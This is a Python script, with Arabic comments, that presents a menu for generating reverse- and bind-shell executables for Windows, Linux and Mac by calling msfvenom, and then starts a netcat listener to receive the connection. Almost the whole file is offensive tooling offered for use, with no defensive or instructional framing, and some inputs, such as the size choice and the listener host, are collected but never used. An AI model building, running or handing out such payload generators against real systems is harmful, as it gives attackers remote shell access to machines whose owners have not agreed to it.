import os

# دالة لإنشاء Payload
def create_payload():
    print("\033[1;33mCreating Payload...\033[0m")
    
    # اختيار النظام
    print("\n\033[1;34mSelect Target Operating System:\033[0m")
    print("[1] Windows")
    print("[2] Linux")
    print("[3] Mac")
    os_choice = input("\033[1;34mEnter your choice (1/2/3): \033[0m")
    
    if os_choice == "1":
        os_type = "windows"
    elif os_choice == "2":
        os_type = "linux"
    elif os_choice == "3":
        os_type = "mac"
    else:
        print("\033[1;31mInvalid option! Defaulting to Windows.\033[0m")
        os_type = "windows"
    
    # اختيار نوع الاتصال
    print("\n\033[1;34mSelect Connection Type:\033[0m")
    print("[1] Reverse Shell")
    print("[2] Bind Shell")
    connection_type = input("\033[1;34mEnter your choice (1/2): \033[0m")
    
    if connection_type == "1":
        connection = "reverse"
    elif connection_type == "2":
        connection = "bind"
    else:
        print("\033[1;31mInvalid option! Defaulting to Reverse Shell.\033[0m")
        connection = "reverse"
    
    # إدخال الهوست والبورت
    target_ip = input("Enter Target IP: ")
    target_port = input("Enter Target Port: ")
    
    # اختيار الحجم
    print("\n\033[1;34mSelect Payload Size:\033[0m")
    print("[1] Small")
    print("[2] Medium")
    print("[3] Large")
    size_choice = input("\033[1;34mEnter your choice (1/2/3): \033[0m")
    
    if size_choice == "1":
        size = "small"
    elif size_choice == "2":
        size = "medium"
    elif size_choice == "3":
        size = "large"
    else:
        print("\033[1;31mInvalid option! Defaulting to Small.\033[0m")
        size = "small"
    
    # بناء الـ Payload
    payload = f"Creating {os_type} {connection} payload with size {size} at {target_ip}:{target_port}"
    print("\033[1;32mPayload created successfully!\033[0m")
    
    # تنفيذ عملية إنشاء الـ Payload باستخدام msfvenom أو أداة مشابهة
    if os_type == "windows":
        if connection == "reverse":
            os.system(f"msfvenom -p windows/shell_reverse_tcp LHOST={target_ip} LPORT={target_port} -f exe > payload.exe")
        elif connection == "bind":
            os.system(f"msfvenom -p windows/shell_bind_tcp RHOST={target_ip} LPORT={target_port} -f exe > payload.exe")
    
    elif os_type == "linux":
        if connection == "reverse":
            os.system(f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={target_ip} LPORT={target_port} -f elf > payload.elf")
        elif connection == "bind":
            os.system(f"msfvenom -p linux/x86/shell_bind_tcp RHOST={target_ip} LPORT={target_port} -f elf > payload.elf")
    
    elif os_type == "mac":
        if connection == "reverse":
            os.system(f"msfvenom -p osx/x86/shell_reverse_tcp LHOST={target_ip} LPORT={target_port} -f macho > payload.macho")
        elif connection == "bind":
            os.system(f"msfvenom -p osx/x86/shell_bind_tcp RHOST={target_ip} LPORT={target_port} -f macho > payload.macho")
    
    print(f"\033[1;32mPayload has been successfully generated for {os_type} system.\033[0m")


# دالة لبدء الـ Listener (مثال بسيط)
def start_listener():
    print("\033[1;33mStarting Listener...\033[0m")
    
    # الحصول على عنوان الـ IP والبورت
    lhost = input("Enter the Listener Host IP: ")
    lport = input("Enter the Listener Port: ")
    
    # بدء الـ listener عبر netcat (مثال)
    print(f"Starting listener on {lhost}:{lport}...")
    os.system(f"nc -lvnp {lport}")
